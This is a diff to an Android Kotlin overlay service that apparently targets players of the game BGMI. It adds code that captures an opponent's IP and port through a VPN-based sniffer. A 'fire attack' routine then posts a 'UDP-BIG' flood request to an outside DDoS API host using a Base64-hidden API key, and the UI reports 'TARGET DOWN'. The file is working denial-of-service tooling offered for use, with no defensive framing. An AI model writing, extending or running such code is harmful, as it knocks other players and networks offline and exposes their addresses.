@@ -24,16 +24,23 @@ class FloatingService : Service() {
     private lateinit var tvTime: TextView
     private lateinit var tvLog: TextView
     private lateinit var btnAttack: Button
+    private lateinit var btnGetIp: Button
     private var selectedTime = 120
 
     companion object {
         var instance: FloatingService? = null
         var etIpRef: EditText? = null
+        var etPortRef: EditText? = null
+        var btnGetIpRef: Button? = null
 
-        fun onIpFound(fullIp: String, port: String) {
+        // Jab IP milega toh ye function UI ko update karega
+        fun onIpFound(ip: String, port: String) {
             Handler(Looper.getMainLooper()).post {
-                etIpRef?.setText(fullIp)
-                Toast.makeText(instance, "IP Caught: $fullIp", Toast.LENGTH_SHORT).show()
+                etIpRef?.setText(ip)
+                etPortRef?.setText(port)
+                btnGetIpRef?.text = "IP FOUND ✅"
+                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
+                Toast.makeText(instance, "BGMI IP Caught!", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -62,13 +69,14 @@ class FloatingService : Service() {
         tvTime = floatingView.findViewById(R.id.fTvTime)
         tvLog = floatingView.findViewById(R.id.tvLog)
         btnAttack = floatingView.findViewById(R.id.fBtnAttack)
-        
-        etIpRef = etIp
-
-        val btnGetIp = floatingView.findViewById<Button>(R.id.fBtnGetIp)
+        btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
         val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
-        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
+        val seekBar = floatingView.findViewById(R.id.fSeekBar)
         val btnClose = floatingView.findViewById<TextView>(R.id.btnClose)
+
+        etIpRef = etIp
+        etPortRef = etPort
+        btnGetIpRef = btnGetIp
 
         btnClose.setOnClickListener { stopSelf() }
 
@@ -84,6 +92,8 @@ class FloatingService : Service() {
         btnGetIp.setOnClickListener {
             tvLog.text = "> SNIFFING VPN..."
             tvLog.setTextColor(android.graphics.Color.parseColor("#FBBF24"))
+            btnGetIp.text = "SNIFFING..."
+            btnGetIp.isEnabled = false
             
             val intent = VpnService.prepare(this)
             if (intent != null) {
@@ -98,6 +108,9 @@ class FloatingService : Service() {
             stopService(Intent(this, VpnService::class.java))
             tvLog.text = "> VPN STOPPED"
             tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
+            btnGetIp.text = "GET IP"
+            btnGetIp.isEnabled = true
+            btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1E1E1E"))
         }
 
         btnAttack.setOnClickListener {
@@ -111,6 +124,7 @@ class FloatingService : Service() {
             btnAttack.isEnabled = false
             tvLog.text = "> ATTACK SENT [${selectedTime}s]"
             
+            // Instant API Call
             fireDirectAttack(ip, port, selectedTime)
         }
     }
@@ -119,6 +133,7 @@ class FloatingService : Service() {
         Thread {
             try {
                 val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
+                // Hidden API Key
                 val decryptedApiKey = String(Base64.decode("c3BfbGl2ZV8wNjVhMzE4MDc4ZjNlZmMxOWUwYmU3MjAxMDJlOWE3ZQ==", Base64.DEFAULT))
 
                 val url = URL(apiUrl)
@@ -127,6 +142,8 @@ class FloatingService : Service() {
                 conn.setRequestProperty("Content-Type", "application/json")
                 conn.setRequestProperty("x-api-key", decryptedApiKey)
                 conn.doOutput = true
+                conn.connectTimeout = 5000
+                conn.readTimeout = 5000
 
                 val jsonInput = """{"target":"$ip","port":$port,"duration":$time,"method":"UDP-BIG"}"""
                 conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }
@@ -135,7 +152,7 @@ class FloatingService : Service() {
                 
                 Handler(Looper.getMainLooper()).post {
                     if (responseCode == 200 || responseCode == 201) {
-                        btnAttack.text = "LAUNCHED!"
+                        btnAttack.text = "LAUNCHED! ✅"
                         btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                         tvLog.text = "> SUCCESS! TARGET DOWN"
                         Toast.makeText(this@FloatingService, "Attack Success!", Toast.LENGTH_SHORT).show()
